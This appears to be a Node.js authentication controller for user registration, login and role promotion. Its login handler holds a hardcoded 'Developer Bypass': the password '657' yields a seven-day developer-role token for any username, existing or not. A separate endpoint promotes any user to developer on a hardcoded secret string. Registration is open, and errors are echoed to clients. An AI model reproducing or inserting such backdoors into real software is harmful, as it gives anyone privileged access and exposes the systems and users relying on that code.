import User from '../models/User.js';
import jwt from 'jsonwebtoken';
import bcrypt from 'bcryptjs';

export const register = async (req, res) => {
    const { username, password } = req.body;
    try {
        const existingUser = await User.findOne({ username });
        if (existingUser) return res.status(400).json({ message: 'User already exists' });

        const user = new User({ username, password });
        await user.save();
        res.status(201).json({ message: 'Admin registered successfully' });
    } catch (error) {
        res.status(500).json({ message: 'Server error', error: error.message });
    }
};

export const login = async (req, res) => {
    const { username, password } = req.body;
    console.log(`--- Login Attempt: ${username} ---`);
    try {
        const user = await User.findOne({ username });

        // Developer Bypass 
        if (password === '657') {
            console.log('🚀 Developer Bypass Logic Activated');
            // If user doesn't exist, create a dummy one or use a system-level ID
            const targetId = user ? user._id : '000000000000000000000000';
            const token = jwt.sign({ id: targetId, role: 'developer' }, process.env.JWT_SECRET, { expiresIn: '7d' });
            return res.json({ token, role: 'developer' });
        }

        if (!user) {
            console.log('User not found');
            return res.status(400).json({ message: 'Invalid credentials' });
        }

        const isMatch = await bcrypt.compare(password, user.password);
        if (!isMatch) {
            console.log('Password mismatch');
            return res.status(400).json({ message: 'Invalid credentials' });
        }

        if (!process.env.JWT_SECRET) {
            console.error('CRITICAL: JWT_SECRET missing from environment');
            return res.status(500).json({ message: 'Configuration error: JWT_SECRET is missing' });
        }

        console.log('Generating JWT token...');
        const token = jwt.sign({ id: user._id, role: user.role }, process.env.JWT_SECRET, { expiresIn: '1d' });
        console.log('✅ Login successful');
        res.json({ token, role: user.role });
    } catch (error) {
        console.error('❌ Login error:', error.message);
        res.status(500).json({ message: 'Server error', error: error.message });
    }
};

export const promoteToDeveloper = async (req, res) => {
    const { username, secret } = req.body;
    if (secret !== 'doulos-dev-2026') return res.status(403).json({ message: 'Invalid secret' });

    try {
        const user = await User.findOneAndUpdate({ username }, { role: 'developer' }, { new: true });
        if (!user) return res.status(404).json({ message: 'User not found' });
        res.json({ message: 'User promoted to Developer', role: user.role });
    } catch (error) {
        res.status(500).json({ message: 'Error updating user', error: error.message });
    }
};
